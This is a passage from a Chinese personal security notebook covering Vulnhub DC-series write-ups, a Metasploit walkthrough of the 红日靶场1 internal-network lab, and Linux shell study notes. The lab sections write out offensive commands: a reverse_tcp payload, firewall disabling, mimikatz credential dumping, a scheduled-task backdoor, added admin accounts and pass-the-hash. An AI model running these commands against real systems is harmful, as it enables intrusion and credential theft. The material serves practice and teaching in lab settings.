66端口 dirsearch扫描结果 ​ 历史命令操作.bash_history重要部分 wget 192.168.2.43:81/root.txt mv root.txt flag.txt nano flag.txt 可以发现从别的主机上复制了flag，并重名为flag.txt 8086 都是静态页面 这里看了wp正常是从66端口目录扫描出/eno目录，下载并破解zip压缩包，获得80端口的用户凭证的。。 9 不知道为什么没有8 网站 只有一个登录框 sql注入失败，弱口令爆破失败 目录扫描 看到backup还以为有备份文件可以进行代码审计，但是没有； 访问/admin/home.php尝试是否存在未授权，发现没有。 寻找网站框架漏洞 尝试了之后发现只存在rce漏洞 使用第二个py脚本 这个脚本很贴心地给出了服务器信息，并读取了配置文件，获得了clapton用户的凭证。 发现大部分命令明明可以使用的却都执行不了，所以需要反弹shell到kali，经测试可以使用nc进行反弹shell 使用python切换为交互式shell，切换到clapton用户 发现clapton家目录下有note.txt 读取 提示我们用缓冲区溢出漏洞提权，这部分pwn不会 按照下面文章中的方法进行复现 https://zhuanlan.zhihu.com/p/570218595 最后贴上复现成功的截图 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-21 18:54:17 "},"06.WriteUp/靶机/Vulnhub-DC系列.html":{"url":"06.WriteUp/靶机/Vulnhub-DC系列.html","title":"Vulnhub--DC系列","keywords":"","body":"DC1 主机发现 sudo netdiscover 192.168.174.0/24 端口扫描 查看网站 只有注册，登录，找回密码功能（这里用sqlmap没有成功） 很容易知道其是Drupal系统。 寻找漏洞 这里优先使用日期较新，等级为优秀的exp（也可以通过收集到的系统版本寻找日期） 发现成功了。 获得shell后的信息收集 网上查找可知Drupal的配置文件在/sites/default/settings.php,读取后得到flag2和数据库配置信息 连接数据库，需要先将shell切换为交互式 python -c 'import pty;pty.spawn(\"/bin/bash\")' 连接后，查询用户表收集管理员账户信息。 可以看到这里admin的密码是加密了的。这里有三种思路 暴力破解 使用john失败了。 修改密码 需要找到对应的加密脚本。 增加一名用户（管理员权限） 使用SearchSploit查找是否有对应的脚本 python2 /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.174.142/ -u admin1 -p 12345 登录后 尝试提权 $6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80 破解成功后登录flag4用户 仍然使用上面的find提权 DC2 https://cloud.tencent.com/developer/article/1801074 ip重定向，需要添加host记录 cewl密码字典生成，密码爆破 7744端口的ssh爆破 rbash限制 git提权 DC3 https://blog.csdn.net/bwt_D/article/details/121291921 信息收集：得到网站CMS，使用对应版本漏洞exp爆库 john密码哈希爆破 后台任意文件上传 内核提权 DC4 https://blog.csdn.net/weixin_44288604/article/details/108018008 用户登录无防护爆破 rce ssh爆破 信息收集：备份文件，邮件（泄露用户密码） teehee提权 DC5 https://www.freebuf.com/sectool/259277.html 日志包含getshell screen提权 端口扫描 通过contact提交后，页面返回的页脚不同判断出后端有include函数包含了页脚文件。 使用burp爆破参数 文件包含getshell 因为网站没有文件上传功能，所以可以考虑包含日志文件/session文件，或者与phpinfo界面连用。 这里选择包含日志文件 DC6 https://blog.csdn.net/weixin_45996361/article/details/123431118 用户密码爆破（字典为DC2的） wordpress插件activity monitor提供了ping命令，对用户输入无限制导致rce 邮件密码泄露 sudo提权 nmap提权 DC7 端口：22,80 信息收集：github源码泄露 这个账户测试后可以连接ssh ssh连接后信息收集 有邮件 发现都是以下信息，并且每隔一段时间都有You have new mail提示，可以猜测出这是一个定时脚本 ​ dc7user@dc-7:~$ cat /opt/scripts/backups.sh #!/bin/bash rm /home/dc7user/backups/* cd /var/www/html/ drush sql-dump --result-file=/home/dc7user/backups/website.sql cd .. tar -czf /home/dc7user/backups/website.tar.gz html/ gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz chown dc7user:dc7user /home/dc7user/backups/* rm /home/dc7user/backups/website.sql rm /home/dc7user/backups/website.tar.gz drush是drupal的命令，可以修改admin密码 ，不知道为什么在网站目录下才可以 gpg是公钥加密算法，没找到公钥，所以无法解密，否则可以解密重新导入sql文件 mysql -udc7user -pMdR3xOgB7#dW Staff 提权 ​ 通过修改admin密码登录后台，可以编辑博客或者页面。那么直接选择编辑页面写入一个木马。但是需要先安装PHP模块。 ​ 木马写入后，获得www-data用户权限 ​ 从定时脚本所属的用户和用户组入手，用户组为www-data权限为rwx：说明www -data用户可以对其进行读写执行，拥有者为root：说明其运行时的权限为root。所以我们向其写入反弹shell，等待其执行就可以获得root权限。 DC8 https://blog.csdn.net/q90375412/article/details/127351747 sql注入（sqlmap） john破解密码 后台模板getshell exim4提权 DC9 https://blog.csdn.net/m0_65712192/article/details/129250059 可以发现ssh服务是filtered的 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-21 18:54:25 "},"06.WriteUp/靶机/红日靶场1.html":{"url":"06.WriteUp/靶机/红日靶场1.html","title":"红日靶场1","keywords":"","body":" 通过MSF对红日靶场1进行内网渗透 获得边界服务器权限没啥好写的就不写了 获得外网主机权限 木马生成 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.41.128 -f exe > reverse.exe reverse_tcp与bind_tcp的区别 防火墙关闭 windows 查看状态 netsh advfirewall show allprofile state 更改状态 netsh advfirewall set allprofile state on/off 不关的话，执行木马就会弹出这个 获得主机session use exploit/multi/handler set payload windows/meterpreter/reverse_tcp # 要设置木马的生成payload，不然连不上 run 信息收集等 进程迁移 隐蔽自身 选择注入到explorer.exe进程中 explorer.exe是Windows程序管理器或者文件资源管理器，它用于管理Windows图形壳，包括桌面和文件管理，删除该程序会导致Windows图形界面无法使用。 ps | grep \"explore\" migrate pid 切换进程位数 不同的程序需要的位数不同 如：hashdump，kiwi只能在64位进程上执行 提权 先获取到administrator权限 再使用getsystem命令获取system权限 主机信息收集 # 主机信息 ps sysinfo run post/windows/gather/enum_applications # 安装的应用 run post/windows/gather/enum_patches # 安装的补丁 # 网络 route arp netstat –ano 域信息收集 run post/windows/gather/enum_domain 主机shell下 chcp 65001 #解决乱码 ipconfig /all # DNS后缀判断域是否存在 net time /domain # 判断域控 nslookup time_domain # 获取域控ip 密码获取 load kiwi creds_all：列举所有凭据 creds_kerberos：列举所有kerberos凭据 creds_msv：列举所有msv凭据 creds_ssp：列举所有ssp凭据 creds_tspkg：列举所有tspkg凭据 creds_wdigest：列举所有wdigest凭据 dcsync：通过DCSync检索用户帐户信息 dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID golden_ticket_create：创建黄金票据 kerberos_ticket_list：列举kerberos票据 kerberos_ticket_purge：清除kerberos票据 kerberos_ticket_use：使用kerberos票据 lsa_dump_sam：dump出lsa的SAM lsa_dump_secrets：dump出lsa的密文 password_change：修改密码 wifi_list：列出当前用户的wifi配置文件 wifi_list_shared：列出共享wifi配置文件/编码 调用mimikatz 在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。 mimikatz命令 后渗透]Mimikatz使用大全 - 肖洋肖恩、 - 博客园 kiwi_cmd module::xxx kiwi_cmd sekurlsa::wdigest kiwi_cmd sekurlsa::logonpasswod 端口转发 portfwd add -l 1234 -p 4444 -r 192.168.41.129 横向移动 Venom代理 内网穿透工具---Venom使用教程 socks port 然后配合proxychains使用 sockets代理 MSF配置 为当前sesison添加路由 run autoroute -s 192.168.52.0/24 使用socks5模块 background use auxiliary/server/socks_proxy set SRVHOST 127.0.0.1 run 这里需要按一下回车 查看jobs kali配置 让kali中的其他工具也可访问内网主机 安装proxychains sudo apt-get install proxychains 编辑配置文件 sudo vim /etc/proxychains.conf 按照info给出的信息，添加socket代理 VERSION SRVHOST SRVPORT USERNAME PASSWORD 主机扫描 run post/windows/gather/arp_scanner rhosts=192.168.52.0/24 端口和漏洞扫描 上传fscan进行扫描 proxychains nmap -Pn -sT -p22,80,445,21,3306,6379 -sC 192.168.52.141 注意：socks5代理-Pn -sT，不支持icmp协议 漏洞利用 根据fscan的扫描结果可以知道域中三台主机均存在ms17_010漏洞 利用 经过测试，发现只能用admin/smb/ms17_010_command 在Windows2003主机上 添加成功 同理域控server2008也可以使用该payload ipc$连接 IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，也就是两个进程之间可以利用它产生数据交互，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。 net use \\\\ip /u:username password # 建立ipc$连接 net view \\\\ip # 查看目标机器的共享资源 net use z: \\\\IP\\c$ # 将目标c盘映射为本地z盘 dir \\\\ip\\盘符$\\dir_path # 列出指定目录文件 copy \\\\ip\\盘符$\\file save_path # 下载文件 save_path为绝对路径/保存到当前目录 copy file \\\\ip\\盘符$\\file # 复制文件 net use \\\\ip /del /y # 删除ipc$连接 版本＜Windows2012 net time \\\\ip # 查看目标机器时间 at \\\\ip time(11:12) c:\\1.bat # 创建定时任务 版本＞Windows2012 ```cmd net time \\ip # 查看目标机器时间 schtasks /create /tn \"task\" /tr c:\\windows\\temp\\plugin_update.exe /sc once /st 16:32 /S ip /RU System /u username /p \"passwd\" 创建该时间之后的某个时刻自动执行任务，任务名 plugin_update schtasks /run /tn \"task\" /S ip /u username /p \"passwd\" 立即运行后门程序 schtasks /F /delete /tn \"task\" /S ip /u username /p \"passwd\" 删除创建的任务 这里添加了用户，用外网机使用ipc$与域控建立连接后，发现没有权限 ![image-20230331151440023](../../../images/image-20230331151440023-1686283281462.png) 这是因为权限问题 [关于IPC和PTH用户权限问题 | AresX's Blog](https://ares-x.com/2020/03/10/关于IPC和PTH用户权限问题/) > 可以建立ipc$连接： > > - 域用户，并且该域用户在远程计算机的管理员组中。 > > - 本地管理员用户 > > （如果本地管理员组启用了Administrator，那么本地管理员里只有Administrator是可以连接的） ```powershell net user khaz123 khaz777... /add net localgroup administrators username /add 将khaz123用户添加到域控的本地管理员组中（因为是域控服务器添加用户，该用户自动为域用户），ipc$连接成功 远程桌面连接 同一时刻只能有一个用户登录 windows REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f msf 实际上post/windows/manage/enable_rdp就是利用了上面windows修改注册表的方式开启3389端口 run post/windows/manage/enable_rdp rdesktop ip PTH 哈希传递攻击 挑战响应机制，只要知道NTLM哈希，无需知道明文密码，就可以通过认证 impacket 安装：sudo apt install python3-impacket proxychains xxx.py -hashes :91ff0fb948167eb4d080b5330686c02f Administrator@192.168.52.138 psexec.py smbexec.py wmiexec.py MSF use exploit/windows/smb/psexec set rhosts 192.168.52.138 set smbuser administrator set smbpass LM:NTLM set lhost 192.168.52.143 run PTT票据传递 只要知道了KDC和Server密钥，即可伪造黄金票据和白银票据 参考文章 https://blog.csdn.net/qq_44159028/article/details/124631522 https://blog.51cto.com/u_15127677/4045185 https://soapffz.com/archives/558/ 后渗透之meterpreter使用攻略 - 先知社区 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-21 18:53:58 "},"07.基础知识/Linux/linux-shell.html":{"url":"07.基础知识/Linux/linux-shell.html","title":"《Linux命令行与shell脚本编程大全》 笔记","keywords":"","body":"前言： 以下内容为阅读Linux命令行与shell脚本编程大全.第3版 (布鲁姆，布雷斯纳汉) (z-lib.org)笔记。 注：下面使用的linux系统为阿里云服务器Centos7（redhat）或者kali（debian）系统 了解shell shell类型 当用户登录终端的时候，通常会启动一个默认的交互式shell。 系统究竟启动哪个shell，这取决于用户ID配置系统启动什么样的shell程序。 在/etc/passwd文件中，在用户ID记录的第7个字段中列出了默认的shell程序。 例如在kali中登录终端时使用的是zsh类型的shell. cat /etc/passwd khaz: x:1000:1000:khaz,,,:/home/khaz:/usr/bin/zsh ┌──(khaz㉿kali)-[~/桌面] └─$ ls -F /usr/bin/zsh /usr/bin/zsh* 说明/usr/bin/zsh是一个可执行程序 ┌──(khaz㉿kali)-[~/桌面] └─$ ls -l /bin/sh lrwxrwxrwx 1 root root 4 3月 14 2022 /bin/sh -> dash 可以发现用户和系统使用的shell类型不同。 查看所有shell khaz@DESKTOP-JCNAFF7:~$ cat /etc/shells # /etc/shells: valid login shells /bin/sh /bin/bash /usr/bin/bash /bin/rbash /usr/bin/rbash /bin/dash /usr/bin/dash /usr/bin/tmux /usr/bin/screen /bin/zsh /usr/bin/zsh 通常说的sh只是一个软连接，并不是真的有一个shell叫sh。 在debian系操作系统中，sh指向dash； 在centos系操作系统中，sh指向bash。 shell的父子关系 在右边的命令行中可以看到bash进程的ppid就是/user/bin/zsh的pid，所以二者是父子关系。 多次创建bash 退出当前shell，exit 启动shell时的参数 khaz@DESKTOP-JCNAFF7:~$ bash -r khaz@DESKTOP-JCNAFF7:~$ cd ../ bash: cd: restricted khaz@DESKTOP-JCNAFF7:~$ 命令列表 以;隔开的多个命令 pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL 进程列表 创建一个子shell来执行命令列表 (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL) echo $BASH_SUBSHELL：输出子shell数量 [root@izwz99bgx9y93dmv0mir0ez ~]# (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL) /root H1ve web /etc /root H1ve web 1 [root@izwz99bgx9y93dmv0mir0ez ~]# ( pwd ; echo $BASH_SUBSHELL) /root 1 [root@izwz99bgx9y93dmv0mir0ez ~]# ( pwd ;(echo $BASH_SUBSHELL)) /root 2 可以看出有几个括号就有几个子shell 使用linux环境变量 定义 存储有关shell会话和工作环境的信息的变量称为环境变量 分类 全局变量 局部变量 这里的范围指的是变量存在于哪些shell会话中 全局环境变量 系统环境变量基本上都是使用全大写字母，以区别于普通用户的环境变量。 查看全局变量 env 或者printenv：只输出全部的全局变量 [root@izwz99bgx9y93dmv0mir0ez ~]# env (printenv输出的与其相同) XDG_SESSION_ID=897 HOSTNAME=izwz99bgx9y93dmv0mir0ez TERM=xterm SHELL=/bin/bash HISTSIZE=1000 SSH_TTY=/dev/pts/0 USER=root .... printenv var_name或者 echo $var_name：输出特定变量的值。 [root@izwz99bgx9y93dmv0mir0ez ~]# printenv USER root [root@izwz99bgx9y93dmv0mir0ez ~]# echo $USER root 全局环境变量存在于所有的shell会话中 [root@izwz99bgx9y93dmv0mir0ez ~]# bash [root@izwz99bgx9y93dmv0mir0ez ~]# ps -f UID PID PPID C STIME TTY TIME CMD root 11337 11335 0 20:14 pts/0 00:00:00 -bash root 11371 11337 0 20:31 pts/0 00:00:00 bash root 11382 11371 0 20:31 pts/0 00:00:00 ps -f [root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME /root [root@izwz99bgx9y93dmv0mir0ez ~]# exit exit [root@izwz99bgx9y93dmv0mir0ez ~]# ps -f UID PID PPID C STIME TTY TIME CMD root 11337 11335 0 20:14 pts/0 00:00:00 -bash root 11383 11337 0 20:32 pts/0 00:00:00 ps -f [root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME /root 在这个例子中，用bash命令生成一个子shell后，显示了HOME环境变量的当前值，这个值和父shell中的一模一样，都是/root。 局部环境变量 查看局部变量 在Linux系统并没有一个只显示局部环境变量的命令。 set set命令会显示为某个特定进程设置的所有环境变量，包括局部变量、全局变量以及用户定义变量。 [root@izwz99bgx9y93dmv0mir0ez ~]# set BASH=/bin/bash BASHOPTS=checkwinsize:cmdhist:expand_aliases:extquote:force_fignore:histappend:hostcomplete:interactive_comments:login_shell:progcomp:promptvars:sourcepath BASH_ALIASES=() BASH_ARGC=() BASH_ARGV=() BASH_CMDS=() BASH_LINENO=() BASH_SOURCE=() BASH_VERSINFO=([0]=\"4\" [1]=\"2\" [2]=\"46\" [3]=\"2\" [4]=\"release\" [5]=\"x86_64-redhat-linux-gnu\") BASH_VERSION='4.2.46(2)-release' COLUMNS=210 DIRSTACK=() EUID=0 GROUPS=() .... set命令会显示出全局变量、局部变量以及用户定义变量。它还会按照字母顺序对结果进行排序。 env和printenv命令同set命令的区别在于前两个命令不会对变量排序，也不会输出局部变量和用户定义变量。 设置局部用户自定义变量 一旦启动了bash shell（或者执行一个shell脚本），就能创建在这个shell进程内可见的局部变量了。 可以通过等号给环境变量赋值，值可以是数值或字符串。 [root@izwz99bgx9y93dmv0mir0ez ~]# echo $first_var 注：因为没有定义first_var变量，所以输出为空。 [root@izwz99bgx9y93dmv0mir0ez ~]# $first_var=hello world -bash: =hello: command not found 注：定义变量时无需加上$ [root@izwz99bgx9y93dmv0mir0ez ~]# first_var=hello world -bash: world: command not found 注：在为变量赋值字符串时，如果字符串有引号，就需要用单引号括起来。 引用：没有单引号的话，bash shell会以为下一个词是另一个要执行的命令 root@izwz99bgx9y93dmv0mir0ez ~]# first_var ='hello world' -bash: first_var: command not found [root@izwz99bgx9y93dmv0mir0ez ~]# first_var= 'hello world' -bash: hello world: command not found 注：变量和=和值之间不能有空格，否则shell会把其当成命令。 [root@izwz99bgx9y93dmv0mir0ez ~]# first_var='hello world' [root@izwz99bgx9y93dmv0mir0ez ~]# echo $first_var hello world 局部变量的范围 [root@izwz99bgx9y93dmv0mir0ez ~]# ps -f UID PID PPID C STIME TTY TIME CMD root 11337 11335 0 20:14 pts/0 00:00:00 -bash root 11415 11337 0 20:57 pts/0 00:00:00 ps -f [root@izwz99bgx9y93dmv0mir0ez ~]# bash [root@izwz99bgx9y93dmv0mir0ez ~]# child_var='hello khaz' [root@izwz99bgx9y93dmv0mir0ez ~]# echo $child_var hello khaz [root@izwz99bgx9y93dmv0mir0ez ~]# exit exit [root@izwz99bgx9y93dmv0mir0ez ~]# echo $child_var 设置全局变量 创建全局环境变量的方法是先创建一个局部环境变量，然后再把它导出到全局环境中。 export var_name：导出子shell的局部变量到全局环境中（临时修改） [root@izwz99bgx9y93dmv0mir0ez ~]# ps --forest PID TTY TIME CMD 11566 pts/1 00:00:00 bash 11585 pts/1 00:00:00 \\_ ps [root@izwz99bgx9y93dmv0mir0ez ~]# a='khaz' [root@izwz99bgx9y93dmv0mir0ez ~]# bash [root@izwz99bgx9y93dmv0mir0ez ~]# echo $a [root@izwz99bgx9y93dmv0mir0ez ~]# exit exit [root@izwz99bgx9y93dmv0mir0ez ~]# export a [root@izwz99bgx9y93dmv0mir0ez ~]# bash [root@izwz99bgx9y93dmv0mir0ez ~]# echo $a khaz 我发现只能在登录终端的那个shell中export，不能在子shell中export？ 因为export的作用是让子shell可以继承父shell导出过的变量。 并且如果在子shell中修改全局变量的值，也不会影响到父shell中该全局变量的值。 删除环境变量 unset var_name：删除环境变量 [root@izwz99bgx9y93dmv0mir0ez ~]# a=1 [root@izwz99bgx9y93dmv0mir0ez ~]# echo $a 1 [root@izwz99bgx9y93dmv0mir0ez ~]# unset a [root@izwz99bgx9y93dmv0mir0ez ~]# echo $a 设置PATH环境变量 PATH环境变量定义了用于进行命令和程序查找的目录。 下面演示了创建自定义命令，并可以在任何路径下使用该命令。 创建自定义命令，命令内容为输出'hello khaz'，并将其移动到存放自定义命令的目录下 [root@izwz99bgx9y93dmv0mir0ez ~]# vim hello #!/bin/bash echo 'hello khaz' :wq [root@izwz99bgx9y93dmv0mir0ez ~]# mkdir my_cmd [root@izwz99bgx9y93dmv0mir0ez ~]# mv hello my_cmd/ 因为与命令不在同一路径下，提示找不到命令 [root@izwz99bgx9y93dmv0mir0ez ~]# hello -bash: hello: command not found 查看并增加PATH（路径以：分隔） [root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin [root@izwz99bgx9y93dmv0mir0ez ~]# PATH=$PATH:/root/my_cmd/ [root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/my_cmd/ 再次输入命令成功执行 [root@izwz99bgx9y93dmv0mir0ez ~]# hello hello khaz 这种方法对PATH变量的修改只能持续到退出或重启系统。 让环境变量的作用持久化 把我们设置的环境变量放在shell的启动文件/环境文件中。 或者开机启动项/etc/init.d/和/etc/profile.d/ 启动文件/环境文件 登入Linux系统启动一个bash shell时，默认情况下bash会在几个文件中查找命令。 这些文件叫作启动文件或环境文件。 5个不同的启动文件  /etc/profile  $HOME/.bash_profile  $HOME/.bashrc  $HOME/.bash_login  $HOME/.profile /etc/profile文件 /etc/profile文件是bash shell默认的的主启动文件。 只要你登录了Linux系统，bash就会执行/etc/profile启动文件中的命令。 [root@izwz99bgx9y93dmv0mir0ez ~]# cat /etc/profile ..... ..... for i in /etc/profile.d/*.sh ; do if [ -r \"$i\" ]; then if [ \"${-#*i}\" != \"$-\" ]; then . \"$i\" else . \"$i\" >/dev/null fi fi done .... .... 其中的for语句为Linux系统提供了一个放置特定应用程序启动文件的地方，当用户登录时，shell会执行这些文件。 [root@izwz99bgx9y93dmv0mir0ez ~]# ls -al /etc/profile.d/ total 64 drwxr-xr-x. 2 root root 4096 Oct 15 2017 . drwxr-xr-x. 82 root root 4096 Sep 24 23:07 .. -rw-r--r--. 1 root root 123 Jul 31 2015 less.csh -rw-r--r--. 1 root root 121 Jul 31 2015 less.sh -rw-r--r-- 1 root root 105 Aug 2 2017 vim.csh -rw-r--r-- 1 root root 269 Aug 2 2017 vim.sh -rw-r--r--. 1 root root 164 Jan 28 2014 which2.csh -rw-r--r--. 1 root root 169 Jan 28 2014 which2.sh -rw-r--r--. 1 root root 1741 Feb 20 05:44 lang.csh -rw-r--r--. 1 root root 2706 Feb 20 05:44 lang.sh ..... 不难发现，有些文件与系统中的特定应用有关。 大部分应用都会创建两个启动文件：一个供bash shell使用（使用.sh扩展名），一个供c shell使用（使用.csh扩展名）。 其中lang.csh和lang.sh文件是用来设置字符集的。 $HOME目录下的启动文件 这些启动文件都起着同一个作用：提供一个用户专属的启动文件来定义该用户所用到的环 境变量。 [root@izwz99bgx9y93dmv0mir0ez ~]# ls -a $HOME . .. .bash_history .bash_logout .bash_profile .bashrc .cache cqhttp .cshrc H1ve my_cmd .pip .pki .pydistutils.cfg .ssh .tcshrc .viminfo .viminfo.tmp web [root@izwz99bgx9y93dmv0mir0ez ~]# cat $HOME/.bash_profile # .bash_profile # Get the aliases and functions if [ -f ~/.bashrc ]; then . ~/.bashrc fi # User specific environment and startup programs PATH=$PATH:$HOME/bin export PATH 这里先会判断.bashrc文件是否存在，若存在先执行这个文件。 [root@izwz99bgx9y93dmv0mir0ez ~]# cat .bashrc # .bashrc # User specific aliases and functions alias rm='rm -i' alias cp='cp -i' alias mv='mv -i' # Source global definitions if [ -f /etc/bashrc ]; then . /etc/bashrc 这里可以设置别名，比如我添加alias la='ls -a',重启shell后 [root@izwz99bgx9y93dmv0mir0ez ~]# cat ~/.bashrc # .bashrc # User specific aliases and functions alias rm='rm -i' alias cp='cp -i' alias mv='mv -i' alias la='ls -a' # Source global definitions if [ -f /etc/bashrc ]; then . /etc/bashrc fi [root@izwz99bgx9y93dmv0mir0ez ~]# la . .. .bash_history .bash_logout .bash_profile .bashrc .cache cqhttp .cshrc H1ve my_cmd .pip .pki .pydistutils.cfg .ssh .tcshrc .viminfo .viminfo.tmp web PATH=$PATH:$HOME/bin则应该是登录shell后自动添加路径到PATH中 编辑为PATH=$PATH:$HOME/bin:$HOME/my_cmd 重启shell后/source立即生效后 [root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/my_cmd [root@izwz99bgx9y93dmv0mir0ez ~]# hello hello khaz 环境变量立即生效 source xxx 环境变量特性 环境变量有一个很酷的特性就是，它们可作为数组使用。 [root@izwz99bgx9y93dmv0mir0ez ~]# arrary=(1 2 3) [root@izwz99bgx9y93dmv0mir0ez ~]# echo $arrary 1 [root@izwz99bgx9y93dmv0mir0ez ~]# echo $arrary[1] 1[1] [root@izwz99bgx9y93dmv0mir0ez ~]# echo ${arrary[1]} 2 在使用变量时最好将变量名用{}括起来，否则可能会解析错误。 shell脚本编写 创建shell脚本 在创建shell脚本文件时，必须在文件的第一行指定要使用的shell。其格式为：#!/bin/bash 在通常的shell脚本中，井号（#）用作注释行。shell并不会处理shell脚本中的注释行。然而， shell脚本文件的第一行是个例外，#后面的惊叹号会告诉shell用哪个shell来运行脚本。 #!/bin/bash echo hello world 设置权限 sudo chmod +x file_name 运行脚本 shell 脚本文件名 chmod +x 脚本文件名; 脚本文件名 . 脚本文件名 source 脚本文件名 脚本文件名如./name.sh 变量 定义与使用 如果要用到变量，使用$； 如果要操作变量，不使用$。 这条规则的一个例外就是使用printenv显示某个变量的值。 用到变量 → 用到变量的值 echo $a #输出变量的值 printenv PATH #用到变量的值，但不需要加$ 操作变量 a=1 #定义变量 export a #导出变量 unset a #删除变量 特性 能够让变量作为命令行参数 [root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME /root [root@izwz99bgx9y93dmv0mir0ez ~]# ls $HOME H1ve web [root@izwz99bgx9y93dmv0mir0ez ~]# ls /root H1ve web 内敛执行 [root@izwz99bgx9y93dmv0mir0ez ~]# cat `ls` [root@izwz99bgx9y93dmv0mir0ez ~]# cat $(ls) >>读取当前目录的所有文件 将ls的输出作为cat的输入进行执行。 先执行的命令是由当前shell创建的子shell执行的。 加上{}用于区分变量 [root@izwz99bgx9y93dmv0mir0ez ~]# a=b [root@izwz99bgx9y93dmv0mir0ez ~]# echo $ab #因为找不到变量ab，所以输出为空 [root@izwz99bgx9y93dmv0mir0ez ~]# echo ${a}b bb 字符串 当变量值含有空格时，就要加上引号。 [root@izwz99bgx9y93dmv0mir0ez ~]# b= world -bash: world: command not found 单引号：不能解析变量，只会原样输出 双引号：能够解析变量 获取字符串长度 ${#string} ┌──(khaz?kali)-[~] └─$ str='hello khaz' ┌──(khaz?kali)-[~] └─$ echo ${#str} 10 切片 ${string:num1:num2} num1可以省略，默认为0，num2必须有值，支持负数 ┌──(khaz㉿kali)-[~] └─$ str='hello khaz' ┌──(khaz㉿kali)-[~] └─$ echo ${str::2} he ┌──(khaz㉿kali)-[~] └─$ echo ${str::-1} hello kha 截取 str=\"www.runoob.com/linux/linux-shell-variable.html\" echo \"str : ${str}\" echo \"str#*/ : ${str#*/}\" # 从 字符串开头 删除到 左数第一个'/' echo \"str##*/ : ${str##*/}\" # 从 字符串开头 删除到 左数最后一个'/' echo \"str%/* : ${str%/*}\" # 从 字符串末尾 删除到 右数第一个'/' echo \"str%%/* : ${str%%/*}\" # 从 字符串末尾 删除到 右数最后一个'/' >> str : www.runoob.com/linux/linux-shell-variable.html str#*/ : linux/linux-shell-variable.html str##*/ : linux-shell-variable.html str%/* : www.runoob.com/linux str%%/* : www.runoob.com 替换 单个 string=\"text, dummy, text, dummy\" echo ${string/text/TEXT} TEXT, dummy, text, dummy 全部 string=\"text, dummy, text, dummy\" echo ${string//text/TEXT} TEXT, dummy, TEXT, dummy 脚本参数 #!/bin/bash echo \"Shell 传递参数实例！\"; echo '$0' :\"执行的文件名 $0\"; echo '$1' :\"第一个参数为 $1\"; echo '$2' :\"第二个参数为 $2\"; echo '$3' :\"第三个参数为 $3\"; echo \"传递到脚本的参数个数为 $#\"; echo '$*' \"：$*\"; echo '$@' \"：$@\"; echo '$$' :\"脚本进程pid $$\"; echo \"ps :`ps`\"; echo '$!' :\"后台最后一个进程的pid $!\"; echo '$-' :\"显示shell参数 $-\"; echo '$?' :\"显示最后一个命令的退出状态 $?\"; ┌──(root㉿kali)-[/home/khaz] └─# ./shell.sh 1 2 3 Shell 传递参数实例！ $0 :执行的文件名 ./shell.sh $1 :第一个参数为 1 $2 :第二个参数为 2 $3 :第三个参数为 3 传递到脚本的参数个数为 3 $* ：1 2 3 $@ ：1 2 3 $$ :脚本进程pid 2702 ps : PID TTY TIME CMD 2276 pts/0 00:00:00 su 2277 pts/0 00:00:02 zsh 2702 pts/0 00:00:00 shell.sh 2703 pts/0 00:00:00 ps $! :后台最后一个进程的pid $- :显示shell参数 hB $? :显示最后一个命令的退出状态 0 重定向 https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/ 当Linux启动的时候会默认打开三个文件描述符，分别是： 标准输入standard input 0 （默认设备键盘） 标准输出standard output 1（默认设备显示器） 错误输出：error output 2（默认设备显示器） 注意： （1）以后再打开文件，描述符可以依次增加 （2）一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。 文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制） 重定向就是针对文件描述符的操作 重定向符号个数 1个：写入并覆盖 2个：追加 输出重定向 将命令结果输出到文件中，即将输出文件符1/2指向文件，默认为1。 标准输出重定向 > file [root@izwz99bgx9y93dmv0mir0ez study]# ls > file [root@izwz99bgx9y93dmv0mir0ez study]# cat file errorlog file rightlog 标准错误输出重定向 2> file [root@izwz99bgx9y93dmv0mir0ez study]# touch errorlog [root@izwz99bgx9y93dmv0mir0ez study]# afaaafa 2> errorlog [root@izwz99bgx9y93dmv0mir0ez study]# cat errorlog -bash: afaaafa: command not found 标准错误输出和标准输出重定向 &> file ，>& file， >file 2>&1 此处&>或者>&视作整体，二者是一样的，分开没有单独的含义。 & 